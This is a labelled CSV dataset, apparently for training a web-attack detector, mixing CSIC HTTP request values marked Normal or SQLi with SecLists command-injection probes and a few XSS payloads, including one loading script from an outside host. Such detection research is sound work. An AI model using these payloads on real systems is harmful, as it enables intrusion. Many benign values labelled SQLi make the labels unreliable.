payload,label,source
BED3AFA7CF2801103F1FD1FE90F04DD9,Normal,csic_gsi:cisc_normalTraffic_test.txt
M9a,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D375C876D77A5754D106305C2AF8BAA1,Normal,csic_gsi:cisc_normalTraffic_test.txt
San+Miguel+de+Serrezuela,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
E63FBBA71D3A634D867BD58FD5EC940F,Normal,csic_gsi:cisc_normalTraffic_train.txt
14AEFA8A1DFBF7751751C71E1BEA596E,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2527%0A%20str%3D%24%28echo%20RQFVAS%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20//,CMD,seclists_cmd
%27%7C%20%5B%203%20-ne%20%24%28echo%20TYMEOG%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20//,CMD,seclists_cmd
AA1FF5DC5DAEF21C507524823831C7B3,Normal,csic_gsi:cisc_normalTraffic_test.txt
1E570CCB88E0A8F3D650CB8F48DC39E7,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22&echo%20CDFCWV$((36%2B22))$(echo%20CDFCWV)CDFCWV&,CMD,seclists_cmd
%27&&echo%20VNSCPP$((62%2B21))$(echo%20VNSCPP)VNSCPP%26,CMD,seclists_cmd
D80418B7DFEC57DA3A275E92E4D3D0D4,Normal,csic_gsi:cisc_normalTraffic_test.txt
Montmajor,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%0aecho$IFSLGKPQJ$((93%2B84))$(echo$IFSLGKPQJ)LGKPQJ\,CMD,seclists_cmd
8024B4411FD9F67804261E21516BBF33,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1CF3931D3917E2B2C985B99294DE5351,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20FRMTBN%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,CMD,seclists_cmd
Ros,Normal,csic_gsi:cisc_normalTraffic_train.txt
zigon@@@callalelaboca.so,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
167513E6178E1B599011E034262815CD,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
||echo%20HEYZBA$((8%2B23))$(echo%20HEYZBA)HEYZBA%27,CMD,seclists_cmd
'||echo%20UAPCZM$((19%2B50))$(echo%20UAPCZM)UAPCZM%2F%2F,CMD,seclists_cmd
viTUpeRAdOr,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
FC2C0C7F289D5B06837CEC8E50A02F11,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
karattup,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=+,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
romanchu,Normal,csic_gsi:cisc_normalTraffic_test.txt
idealismo,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
editha,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ERXFFG%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20,CMD,seclists_cmd
09CD3738D33B721BF2832BA43F5CA453,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5DD41B15C132D64E3AE90E8B35705EA2,Normal,csic_gsi:cisc_normalTraffic_train.txt
1D4686430120ACF35B5D4519D98F1DF4,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2527%0A%20str%3D%24%28echo%20JKJFEG%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,CMD,seclists_cmd
&&echo$IFSMRIURT$((57%2B24))$(echo$IFSMRIURT)MRIURT\,CMD,seclists_cmd
7893542454974309C34D51D01F7112D7,Normal,csic_gsi:cisc_normalTraffic_test.txt
Frontado+Victory,Normal,csic_gsi:cisc_normalTraffic_train.txt
4AF428246C8671E85E96BED0595DDEB7,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5371068588614892,Normal,csic_gsi:cisc_normalTraffic_test.txt
');}print(`echo%20HDWSHN%0aecho%20$((40%2B78))%0aecho%20HDWSHN%0aecho%20HDWSHN`)%3B%25255C%25255CHDWSHN,CMD,seclists_cmd
E7633F35149719FAB75929126AD34749,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=entrar&login=leonard&pwd=escasamente&remember=off&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
1025489401142113,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%0A%20str%3D%24%28echo%20GZRNZB%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,CMD,seclists_cmd
Co2reer�a,Normal,csic_gsi:cisc_normalTraffic_test.txt
Valencio,Normal,csic_gsi:cisc_normalTraffic_test.txt
Tangil+Bolio,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=3|&nombre=Vino+Rioja&precio=85&cantidad=4&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D52BE42C22F199CD8C3398399DD3534D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
43C931AD1B26A3ABD14FA6C1632FB52B,Normal,csic_gsi:cisc_normalTraffic_train.txt
D5613DB46A015DF9F4DF0A81A621A9FA,Normal,csic_gsi:cisc_normalTraffic_test.txt
Tiago,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5478937412925472,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
A3625159D8DEEA1CB818A1266D10BFF5,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=2&nombre=Queso+Manchego&precio=85&cantidadA=98&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
F33324D6779EF6F03E0832866D2CA578,Normal,csic_gsi:cisc_normalTraffic_test.txt
45C521B5CD6A0B6F7F6550513F6012EA,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Pasaje+America+189+4?A,Normal,csic_gsi:cisc_normalTraffic_train.txt
AEDEFCB317869CE2BCE093408DB07106,Normal,csic_gsi:cisc_normalTraffic_test.txt
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20DKKEQZ%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2526,CMD,seclists_cmd
",latch?for",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=insertar&precio=1640&B1=Confirmar,Normal,csic_gsi:cisc_normalTraffic_test.txt
harihara,Normal,csic_gsi:cisc_normalTraffic_test.txt
32514,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ZTQVNM%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%27,CMD,seclists_cmd
D3C8D2763C28BF75E4A40FD102D51B3E,Normal,csic_gsi:cisc_normalTraffic_test.txt
982E66589B62BD56FC9EA1AF43093CAA,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5DC5E24F349122DA43C874DA22B03FB5,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%0A%20str%3D%24%28echo%20BHVRST%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27,CMD,seclists_cmd
1ici3a6te,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0A%20str%3D%24%28echo%20EIGKOY%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%252F%252F,CMD,seclists_cmd
modo=insertar&precio=9390&B1=Confirmar/,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22%0A%20str%3D%24%28echo%20LZSVGK%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20,CMD,seclists_cmd
20E9BAFF9362BC5FBEE24C604B3EE00A,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%20%5B%202%20-ne%20%24%28echo%20PDVEEQ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20,CMD,seclists_cmd
dressler@sanchezquesada.my,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
281E40B589A8C4A85CE342F1D4C9184A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=@40,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
A55A3A35C2716DF65D4011DEB033CEF7,Normal,csic_gsi:cisc_normalTraffic_test.txt
90702877P,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20FDEYNL%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%257C,CMD,seclists_cmd
%7C%20%5B%209%20-ne%20%24%28echo%20DAJIYU%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,CMD,seclists_cmd
vejete,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B66F46C147BA07B8DF2B62861B1C5236,Normal,csic_gsi:cisc_normalTraffic_test.txt
08B8A6CE817F861999D19862DDF50D67,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
70803791Q,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=harris&password=2nd2y19i78b4e&nombre=Bonifacio&apellidos=Roda+Deita&email=drapinska@mataluenga.pg&dni=47965007W&direccion=Glorieta+Musico+Emilio+Alvarez+Anton+153,+&ciudad=Mediona&cp=05696&provincia=Salamanca&ntc=5527948175762743&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
%27&echo$IFSXNSQSX$((90%2B70))$(echo$IFSXNSQSX)XNSQSX|,CMD,seclists_cmd
1504583168402785,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
09558,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
F4F2691FFDA5B1B656CC714AF8F8687E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
F0587C4711D77C17827D9098813C6B06,Normal,csic_gsi:cisc_normalTraffic_train.txt
293CDE685573C65578886E5FABA83A3A,Normal,csic_gsi:cisc_normalTraffic_train.txt
B5F30B87205DAFEB3C43AED01BD1D342,Normal,csic_gsi:cisc_normalTraffic_test.txt
"""%0aecho%20MJVQYB$((44%2B28))$(echo%20MJVQYB)MJVQYB""",CMD,seclists_cmd
C7A13560C0C0D1EA05F3E0BB4693DF72,Normal,csic_gsi:cisc_normalTraffic_test.txt
3313,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%26echo%20DKZRJM$((95%2B2))$(echo%20DKZRJM)DKZRJM%7C,CMD,seclists_cmd
A1D7659140339FD51DE505B60D01AB2F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Menocal,Normal,csic_gsi:cisc_normalTraffic_test.txt
Ulldecona,Normal,csic_gsi:cisc_normalTraffic_train.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20PDOPTJ%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20//,CMD,seclists_cmd
98964D7E8E73A92848B499701B99D531,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%0aecho$IFSURWJYQ$((9%2B54))$(echo$IFSURWJYQ)URWJYQ%7C,CMD,seclists_cmd
E79DE93D067704CB8B8B5EC3EF81D762,Normal,csic_gsi:cisc_normalTraffic_train.txt
Rebes+Huasequi,Normal,csic_gsi:cisc_normalTraffic_train.txt
92583236W,Normal,csic_gsi:cisc_normalTraffic_test.txt
Novell+Abenoza,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8E049F4CCF6C9129082C9510EA6034AE,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0C4EB35955D487BF4EC1158744A8CEF4,Normal,csic_gsi:cisc_normalTraffic_train.txt
'&echo%20COKQPG$((93%2B87))$(echo%20COKQPG)COKQPG',CMD,seclists_cmd
FA852C598D02F936B06609604CD62220,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=meera&password=boquitue87a&nombre=Safo&apellidos=Koolmees+Moliner&emailA=nomis@wormee.is&dni=13403604D&direccion=Escultor+Garcia+Mas+95,+1?F&ciudad=Sol�rzano&cp=04212&provincia=Burgos&ntc=5498057012879468&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27%7C%20%5B%205%20-ne%20%24%28echo%20YGAAWQ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%22,CMD,seclists_cmd
"Federico+Chueca,+19,+",Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%20%5B%203%20-ne%20%24%28echo%20PDVEEQ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20,CMD,seclists_cmd
modo=entrar&login=schroer&pwd=6enab4e&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%20%5B%206%20-ne%20%24%28echo%20QHEWVV%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23,CMD,seclists_cmd
"<IMG SRC=java%00script:alert(\""XSS\"")>",SQLi,community:payloads_seed
A0749B4FCC3EBC10A4365E56D5DEFEAC,Normal,csic_gsi:cisc_normalTraffic_test.txt
A1391+18u46,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2450684527173490,Normal,csic_gsi:cisc_normalTraffic_test.txt
Castellv�+de+Rosanes,Normal,csic_gsi:cisc_normalTraffic_test.txt
Albella+Sahagun,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
&&echo$IFSQGZOTF$((32%2B38))$(echo$IFSQGZOTF)QGZOTF%5C%5C,CMD,seclists_cmd
%0A%20str%3D%24%28echo%20IKKWEG%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%23,CMD,seclists_cmd
Plaza+Maestrazgo+71+,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=registro&login=tony&password=6ija0or&nombre=Avilio&apellidos=Torrabas+Fabreg�&email=romboh@guiapolicial.mk&dni=53004462L&direccion=Calle+Baena+194+8?A&ciudad=Juarros+de+Riomoros&cp=46720&provincia=Lleida&ntc=7727807756669400&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
%27%7C%20%5B%206%20-ne%20%24%28echo%20XOCDUH%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%255C%255C,CMD,seclists_cmd
${passthru(print(`echo%20HRCXNG;echo%20$((6%2B10));echo%20HRCXNG;echo%20HRCXNG`)%3B.%2522HRCXNG,CMD,seclists_cmd
F0A0BB8962EA6C62C9FC80349D91D5B8,Normal,csic_gsi:cisc_normalTraffic_train.txt
C8168262F2CE4874C3D8DE9BF2FF0597,Normal,csic_gsi:cisc_normalTraffic_train.txt
%3B%20str%3D%24%28echo%20YBRDJI%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C,CMD,seclists_cmd
echo%20NXONQU$((86%2B15))$(echo%20NXONQU)NXONQU',CMD,seclists_cmd
%22echo$IFSTXEBDL$((98%2B30))$(echo$IFSTXEBDL)TXEBDL',CMD,seclists_cmd
5592AFE8CD587892B28968A85CD09999,Normal,csic_gsi:cisc_normalTraffic_train.txt
800EB9CE43979EA186DA98B366701001,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
gundel@tvup.be,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=talya&password=4feren6e&nombre=Nair&apellidos=Licandro+Deza&email=hexum@suecas.com.cs&dni=77003239K&direccion=Calle+Pardillo+S/N,+6-G&ciudad=Ud�as&cp=24275&provincia=A+Coru�a&ntc=3458631034577714&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
C4337D10324942E27C79AE0C26671B8F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C�lica,Normal,csic_gsi:cisc_normalTraffic_train.txt
2CC227127FD620F2704DB849CA38EA2A,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=%00&login=buehler&password=antares&nombre=Joselina&apellidos=Gual+Quirce&email=andreytschenko@mtos.io&dni=31178285Z&direccion=C/+Rafael+Alberti,+140+&ciudad=Castroserrac�n&cp=44233&provincia=Palencia&ntc=2107485639768093&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7951593634712530,Normal,csic_gsi:cisc_normalTraffic_train.txt
0282DC0A043B0FBC6540247F6A94C7EE,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=insertar&precio=8223&B1=Confirmar/,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7BBF2FE693A799FB44E496DF2D35287C,Normal,csic_gsi:cisc_normalTraffic_train.txt
1949FA40F4C7D1E57176F11876074B8B,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Cabo+De+Agua,+S/N+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Casadei+Atuesta,Normal,csic_gsi:cisc_normalTraffic_test.txt
0A523FEBCA8B2CF0D403655525A8F47B,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%7Cecho%20WWSFKA$((8%2B52))$(echo%20WWSFKA)WWSFKA//,CMD,seclists_cmd
0FAE33181C8DE296504798E404A1E2B1,Normal,csic_gsi:cisc_normalTraffic_train.txt
02B3494539EF96A341B2293B5E6ED2F3,Normal,csic_gsi:cisc_normalTraffic_train.txt
boeck,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=3&nombre=Jam�n+Ib�rico&precio=paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2&cantidad=49&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Ogando+Huguet,Normal,csic_gsi:cisc_normalTraffic_test.txt
7785,Normal,csic_gsi:cisc_normalTraffic_train.txt
80DA148A892DFE7E6372919F6BC5A37F,Normal,csic_gsi:cisc_normalTraffic_train.txt
edson-leith@lettere.pk,Normal,csic_gsi:cisc_normalTraffic_test.txt
Adolfina,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"<SCRIPT a=`>` SRC=""http://xss.rocks/xss.js""></SCRIPT>",XSS,community:payloads_seed
B36C9D8EAE2FC7052D232245AD8C477D,Normal,csic_gsi:cisc_normalTraffic_train.txt
117C668752A0D48C303AC138391E61C2,Normal,csic_gsi:cisc_normalTraffic_test.txt
%27%7C%7Cecho%20JQLWQP$((26%2B32))$(echo%20JQLWQP)JQLWQP',CMD,seclists_cmd
Calle+Compositor+Ramon+Medina+59+,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=1&nombre=Vino+Rioja&precio=85&cantidad=50&B1=A�adir+al+carrito'OR'a='a,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B2=%3F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
88CC5ECE680EFE39AE6737A92970333E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2DBA58AD1EDD1944DF632020C4C7FFE7,Normal,csic_gsi:cisc_normalTraffic_test.txt
5D47D359FB8ABD5CFD9F27C7099FEECE,Normal,csic_gsi:cisc_normalTraffic_test.txt
fechner_rabel@fortelingenieria.sd,Normal,csic_gsi:cisc_normalTraffic_train.txt
87CE0968E6CE69452A139739CF2A2E50,Normal,csic_gsi:cisc_normalTraffic_test.txt
2bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
94D84F41EFF824748D1033F962FE2C4A,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20KQPSND%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,CMD,seclists_cmd
&echo%20XDZINA$((98%2B93))$(echo%20XDZINA)XDZINA%7C,CMD,seclists_cmd
9F2775B3EBA347EC5520E65689D50C85,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar&precio=90&B1=Confirmar/,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Sartajada,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
echo%20NXXMYC$((83%2B4))$(echo%20NXXMYC)NXXMYC%5C%5C,CMD,seclists_cmd
ECFB53F4E19DBE3814B6A02E79ABC7FD,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"errorMsg=""+AND+""1""=""1",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Llocnou+de+la+Corona,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0D87B9B7EC3B8C664D794E6E56858B92,Normal,csic_gsi:cisc_normalTraffic_train.txt
57641085A,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=chevy&pwd=batanea!r&remember=off&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
3795360055557246,Normal,csic_gsi:cisc_normalTraffic_test.txt
F218BDEF0035A677BC5A237484A7B54C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%7C%20%5B%208%20-ne%20%24%28echo%20GSLYBH%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20//,CMD,seclists_cmd
modo=entrar&login=hanny&pwd=MAManToNa&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
eveline,Normal,csic_gsi:cisc_normalTraffic_test.txt
69B7B5B7CAD7E6687E3DBA71ED67ACED,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Rinconada+de+la+Sierra,+La",Normal,csic_gsi:cisc_normalTraffic_train.txt
es137z7ble,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Abdel,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C5EE911D85CD8CB193654E5AF27F31E0,Normal,csic_gsi:cisc_normalTraffic_test.txt
longo@elbauldelosrefranes.web,Normal,csic_gsi:cisc_normalTraffic_train.txt
F921D87CC325337C99C57B8B4AE8859B,Normal,csic_gsi:cisc_normalTraffic_train.txt
2D526DFCC6EB396B63C7077A4C681820,Normal,csic_gsi:cisc_normalTraffic_test.txt
6D01DCFEE3DBA84D1084B09BE4B4EFD0,Normal,csic_gsi:cisc_normalTraffic_train.txt
Salina,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
01BA5EC6F3EE47F9093AAE79CBBF146D,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20BKAIFJ%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%252F%252F,CMD,seclists_cmd
%2527%0A%20str%3D%24%28echo%20GBQYNR%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,CMD,seclists_cmd
%3B%20str%3D%24%28echo%20HNLFQM%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2526,CMD,seclists_cmd
C9375B22F921622595DB7071EE58D110,Normal,csic_gsi:cisc_normalTraffic_train.txt
0150E88CE081630067A3D442A7D17B55,Normal,csic_gsi:cisc_normalTraffic_train.txt
7260A2D15852F1A521A8C2FA150E67FD,Normal,csic_gsi:cisc_normalTraffic_train.txt
Ostapovich+Furnari,Normal,csic_gsi:cisc_normalTraffic_train.txt
Espadero+Volonte,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=3&nombre=Jam�n+Ib�rico&precio=39&cantidad=46&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
Bidegoian,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0E0761348A8B8D9906800396261523C9,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=insertar&precio=8271&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27%0A%20str%3D%24%28echo%20FXCZOR%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526,CMD,seclists_cmd
AAF943E23EEB1E965E11FC808587FE81,Normal,csic_gsi:cisc_normalTraffic_train.txt
9FC49B30F0FE9394EFF023453C9E5190,Normal,csic_gsi:cisc_normalTraffic_train.txt
AA6F2B3B2779828122AF814048BF3CE2,Normal,csic_gsi:cisc_normalTraffic_test.txt
5D9C8176A90FA035167127A8993F678B,Normal,csic_gsi:cisc_normalTraffic_test.txt
33908887X,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Guadalc�zar,Normal,csic_gsi:cisc_normalTraffic_test.txt
4F7C65E813FFFFF59414AF0E13801A10,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Sp�nola+Ballado,Normal,csic_gsi:cisc_normalTraffic_train.txt
germain@elcorteitaliano.cat,Normal,csic_gsi:cisc_normalTraffic_train.txt
52E74F5A9BFBC7780A87C73CBB053D2C,Normal,csic_gsi:cisc_normalTraffic_test.txt
A0DF5E7426F41DD6EC1A54652C77A2FD,Normal,csic_gsi:cisc_normalTraffic_test.txt
6047,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
plater-z,Normal,csic_gsi:cisc_normalTraffic_train.txt
1134011255413195,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3FBADF9F3AF21FB3D6B56BC333E0E9CD,Normal,csic_gsi:cisc_normalTraffic_test.txt
C6F7EE7AE352933F891E84B76E66F818,Normal,csic_gsi:cisc_normalTraffic_train.txt
erlich-jarrel@modeloscaninos.ni,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=insertar&precio=4613&B1=Confirmar|,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Secastilla,Normal,csic_gsi:cisc_normalTraffic_test.txt
F2FDF5ACCD99E02D714E6E1CF5E05FEB,Normal,csic_gsi:cisc_normalTraffic_train.txt
